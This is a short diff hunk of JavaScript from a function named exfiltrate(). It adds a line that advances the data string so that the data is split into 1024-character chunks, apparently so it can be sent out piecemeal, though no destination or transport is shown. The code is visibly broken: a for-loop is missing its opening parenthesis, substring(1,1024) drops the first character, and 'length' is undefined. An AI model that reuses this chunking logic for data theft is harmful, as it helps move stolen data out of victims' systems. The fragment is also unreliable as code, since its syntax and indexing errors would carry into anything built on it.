@@ -30,6 +30,7 @@ function exfiltrate() {
                 while (size > CHUNKSIZE) {
                         let chunk = data.substring(1,1024);
                         chunks.push(chunk);
+                        data = data.substring(1024,length);
                         size = size - CHUNKSIZE;
                 }
                 for let i = 0; i < totalChunks; i++) {
